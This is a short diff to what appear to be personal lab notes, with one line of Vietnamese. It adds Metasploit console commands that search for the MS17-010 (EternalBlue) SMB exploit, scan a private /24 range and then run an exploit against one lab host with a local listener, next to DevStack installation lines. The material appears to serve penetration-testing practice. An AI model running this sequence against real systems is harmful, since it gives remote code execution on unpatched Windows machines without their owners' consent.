@@ -1,5 +1,17 @@
 snap install metasploit-framework
-
+search ms17-010
+use 1
+show options
+set RHOSTS 192.168.57.0-255
+set THREADS 10
+run
+ Khởi động Metasploit Framework và chạy câu lệnh “search ms17-010” 
+use 2
+show options
+set RHOSTS 192.168.57.133
+set LHOSTS 192.168.57.132
+run
+help
 sudo apt update && sudo apt upgrade -y
 sudo apt install git -y
 git clone https://opendev.org/openstack/devstack.git
